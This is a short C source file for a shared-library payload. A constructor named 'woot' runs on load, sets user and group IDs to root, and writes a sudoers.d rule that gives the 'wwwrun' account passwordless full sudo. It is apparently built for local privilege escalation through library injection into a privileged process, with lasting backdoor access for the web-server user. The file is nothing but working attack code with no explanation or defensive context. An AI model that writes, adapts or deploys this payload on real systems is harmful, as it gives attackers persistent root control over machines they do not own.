#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c",
          "umask 077; "
          "printf '%s\\n' 'wwwrun ALL=(ALL:ALL) NOPASSWD: ALL' "
          "> /etc/sudoers.d/wwwrun && "
          "chmod 0440 /etc/sudoers.d/wwwrun && "
          "/usr/sbin/visudo -c",
          (char *)NULL);
}
